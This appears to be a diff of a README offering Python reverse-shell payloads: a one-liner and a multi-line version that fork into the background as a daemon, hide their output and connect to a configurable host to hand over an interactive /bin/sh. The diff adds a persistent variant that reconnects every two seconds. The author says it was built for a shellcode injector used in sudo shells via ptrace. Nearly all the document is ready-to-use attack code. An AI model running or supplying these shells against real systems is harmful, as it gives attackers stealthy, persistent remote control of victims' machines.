@@ -2,10 +2,15 @@
 
 Just change the part: "127.0.0.1",9999
 
-python 2 & python 3:
+Simple reverse shell:
 ```
 python -c 'exec("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("127.0.0.1",9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
 ```
+
+Infinite loop reverse shell each 2 seconds:
+```
+```
+
 
 I made this for my shellcode injector in sudo shells via ptrace:
 
@@ -19,7 +24,10 @@ http://www.fr33project.org
 
 dreg@fr33project.org
 
-multi line code:
+## multi line code
+
+### Simple reverse shell 
+
 ```
 import socket,subprocess,os,sys
 
@@ -58,6 +66,54 @@ os.dup2(sdregs.fileno(),1)
 os.dup2(sdregs.fileno(),2)
 
 p=subprocess.call(["/bin/sh","-i"])
+```
+
+### Infinite loop reverse shell each 2 seconds
+
+```
+import socket,subprocess,os,sys, time
+
+pidrg = os.fork()
+if pidrg > 0:
+        sys.exit(0)
+
+os.chdir("/")
+os.setsid()
+os.umask(0)
+drgpid = os.fork()
+if drgpid > 0:
+        sys.exit(0)
+
+while 1:
+        try:
+                sys.stdout.flush()
+
+                sys.stderr.flush()
+
+                fdreg = open("/dev/null", "w")
+
+                sys.stdout = fdreg
+
+                sys.stderr = fdreg
+
+                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+                sdregs.connect(("127.0.0.1",9999))
+
+                os.dup2(sdregs.fileno(),0)
+
+                os.dup2(sdregs.fileno(),1)
+
+                os.dup2(sdregs.fileno(),2)
+
+                p=subprocess.call(["/bin/sh","-i"])
+
+                sdregs.close()
+
+        except Exception:
+                pass
+
+        time.sleep(2)
 ```
 
 http://jagt.github.io/python-single-line-convert/
